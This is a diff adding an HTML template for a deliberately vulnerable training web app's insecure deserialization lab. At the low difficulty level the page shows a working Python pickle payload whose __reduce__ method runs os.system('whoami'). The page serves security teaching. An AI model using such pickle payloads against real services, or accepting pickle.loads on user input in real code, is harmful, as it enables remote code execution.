@@ -1,0 +1,41 @@
+{% extends "base.html" %}
+{% block title %}Deserialization - A08{% endblock %}
+{% block content %}
+<div class="row">
+    <div class="col-md-8">
+        <h3>Insecure Deserialization</h3>
+        <p class="text-muted">A08: Data Integrity Failures - Difficulty: <strong>{{ security_level }}</strong></p>
+
+        <div class="card mb-4">
+            <div class="card-body">
+                <h5>Submit Serialized Data</h5>
+                <form method="POST">
+                    <div class="mb-3">
+                        <label class="form-label">Serialized Object (Base64)</label>
+                        <textarea name="data" class="form-control" rows="4" placeholder="Enter base64-encoded data"></textarea>
+                    </div>
+                    <button type="submit" class="btn btn-info">Deserialize</button>
+                </form>
+                {% if security_level == "LOW" %}
+                <small class="text-danger">Vulnerable: Uses pickle.loads(). Try Python pickle payload.</small>
+                <p class="mt-2"><strong>Python payload:</strong></p>
+                <code>import pickle, os, base64<br>class Exploit:<br>&nbsp;&nbsp;def __reduce__(self):<br>&nbsp;&nbsp;&nbsp;&nbsp;return (os.system, ('whoami',))<br>print(base64.b64encode(pickle.dumps(Exploit())).decode())</code>
+                {% elif security_level == "MEDIUM" %}
+                <small class="text-warning">Partial: Uses JSON parsing (safe from RCE).</small>
+                {% else %}
+                <small class="text-success">Secure: Strict schema validation with allowlist.</small>
+                {% endif %}
+            </div>
+        </div>
+
+        {% if result %}
+        <div class="card">
+            <div class="card-body">
+                <h5>Result:</h5>
+                <pre class="result-box">{{ result }}</pre>
+            </div>
+        </div>
+        {% endif %}
+    </div>
+</div>
+{% endblock %}
